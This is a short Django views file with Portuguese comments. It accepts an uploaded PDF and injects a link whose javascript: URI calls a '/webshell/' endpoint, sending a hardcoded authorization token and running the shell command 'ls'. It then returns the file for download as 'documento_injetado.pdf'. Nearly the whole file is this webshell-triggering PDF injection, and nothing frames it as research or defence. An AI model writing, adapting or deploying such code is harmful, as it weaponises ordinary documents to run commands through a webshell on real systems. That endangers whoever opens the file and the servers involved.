# pdf_builder/views.py

from django.shortcuts import render
from django.http import HttpResponse
from PyPDF2 import PdfWriter, PdfReader
import io

def gerar_pdf(request):
    # Verificar se o método da requisição é POST
    if request.method == 'POST' and request.FILES.get('pdf_file'):
        pdf_file = request.FILES['pdf_file']
        reader = PdfReader(pdf_file)
        writer = PdfWriter()
    else:
        return HttpResponse("Por favor, forneça um arquivo PDF.", status=400)

    # Adicionar um link que executa um webshell
    page = reader.pages[0]
    page.add_link(
        pagenum=0,
        rect=[50, 50, 200, 100],  # Definir a posição e o tamanho do link
        uri="javascript:fetch('/webshell/', {method: 'POST', headers: {'Content-Type': 'application/json', 'Authorization': 'um-token-muito-seguro-e-unico'}, body: JSON.stringify({command: 'ls'})});",  # Executa um comando no webshell
    )

    # Adicionar a página modificada ao novo PDF
    writer.add_page(page)

    # Criar um arquivo PDF em memória
    pdf_output = io.BytesIO()
    writer.write(pdf_output)
    pdf_output.seek(0)

    # Criar a resposta HTTP com o PDF como download
    response = HttpResponse(pdf_output, content_type="application/pdf")
    response['Content-Disposition'] = 'attachment; filename="documento_injetado.pdf"'

    return response

def painel(request):
    return render(request, 'painel.html')

